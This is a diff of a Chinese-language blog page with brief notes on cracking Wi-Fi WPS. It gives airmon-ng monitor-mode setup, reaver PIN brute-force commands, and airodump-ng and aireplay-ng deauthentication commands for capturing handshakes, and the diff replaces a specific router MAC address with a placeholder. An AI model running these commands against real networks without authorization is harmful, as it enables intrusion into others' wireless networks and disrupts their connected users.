@@ -23,7 +23,7 @@ WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng 
 WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng start wlan1(原网卡名字为wlan1)
 可能会出现process占用问题airmon-ng check           查看占用进程iwconfig                  查看网卡是否处于monitor状态sudo ai">
 <meta property="og:image" content="http://a1ex.net/imgs/xxxxxxx">
-<meta property="og:updated_time" content="2015-11-02T09:29:16.885Z">
+<meta property="og:updated_time" content="2015-11-06T10:36:39.925Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="A1exlism">
 <meta name="twitter:description" content="本机开启monitor模式的网卡名字为:wlan1mon
@@ -93,7 +93,7 @@ WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng 
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2015-11-02T09:29:16.885Z" itemprop="datePublished"> 发表于 11-02-2015</time>
+    <time datetime="2015-11-06T10:36:39.925Z" itemprop="datePublished"> 发表于 11-06-2015</time>
     
   </p>
 </header>
@@ -106,8 +106,8 @@ WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng 
 <h3 id="扫描">扫描</h3><p>airodump-ng wlan1mon<br>(MB选项的54e.和54e已经不能判断wps了)</p>
 <p>目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1<br>目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1<br>目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1</p>
 <p>6C:59:40:44:AB:64</p>
-<p>reaver -i wlan1mon -b 6C:59:40:44:AB:64 -a -S -vv -d0 -c 1</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. airodump-ng -w freedom -c CH --bssid  6C:59:40:44:AB:64 wlan1mon --ignore-negative-one&#10;CH&#34920;&#31034;&#20449;&#36947;&#65292;&#20449;&#36947;&#26159;&#22810;&#23569;&#23601;&#22635;&#22810;&#23569;&#65292;freedom&#26159;&#19968;&#20250;&#25235;&#25569;&#25163;&#21253;&#30340;&#25991;&#20214;&#21517;&#23383;&#65292;&#20182;&#20250;&#33258;&#21160;&#29983;&#25104;&#19968;&#20010;freedom.cap&#30340;&#25991;&#20214;&#65292;&#36825;&#20010;&#21517;&#23383;&#38543;&#20415;&#20320;&#20204;&#22635;&#20160;&#20040;&#10;2. &#37325;&#26032;&#24320;&#19968;&#20010;&#23458;&#25143;&#31471;&#36755;&#20837;&#21629;&#20196;&#65306;&#10;aireplay-ng --deaut 10 -a &#36335;&#30001;&#22120;mac -c &#23458;&#25143;&#31471;mac wlan1mon --ignore-negative-one</span><br></pre></td></tr></table></figure>
+<p>reaver -i wlan1mon -b mac地址 -a -S -vv -d0 -c 1</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. airodump-ng -w freedom -c CH --bssid  mac&#22320;&#22336; wlan1mon --ignore-negative-one&#10;CH&#34920;&#31034;&#20449;&#36947;&#65292;&#20449;&#36947;&#26159;&#22810;&#23569;&#23601;&#22635;&#22810;&#23569;&#65292;freedom&#26159;&#19968;&#20250;&#25235;&#25569;&#25163;&#21253;&#30340;&#25991;&#20214;&#21517;&#23383;&#65292;&#20182;&#20250;&#33258;&#21160;&#29983;&#25104;&#19968;&#20010;freedom.cap&#30340;&#25991;&#20214;&#65292;&#36825;&#20010;&#21517;&#23383;&#38543;&#20415;&#20320;&#20204;&#22635;&#20160;&#20040;&#10;2. &#37325;&#26032;&#24320;&#19968;&#20010;&#23458;&#25143;&#31471;&#36755;&#20837;&#21629;&#20196;&#65306;&#10;aireplay-ng --deaut 10 -a &#36335;&#30001;&#22120;mac -c &#23458;&#25143;&#31471;mac wlan1mon --ignore-negative-one</span><br></pre></td></tr></table></figure>
 <h3 id="Reference:">Reference:</h3><p><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">secbox</a><br><a href="http://www.kali.org.cn/thread-17187-1-1.html" target="_blank" rel="external">kali.org</a><br><a href="http://unix.stackexchange.com/questions/162088/why-airmon-ng-does-not-create-a-monitoring-interface" target="_blank" rel="external">stackexchange</a><br><a href="http://www.freebuf.com/tools/75517.html" target="_blank" rel="external">Frebuf</a><br><a href="http://www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/" target="_blank" rel="external">hackingtutorials</a></p>
 <p><a href="http://netsecurity.51cto.com/art/201105/264844_all.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201105/264844_all.htm</a></p>
   
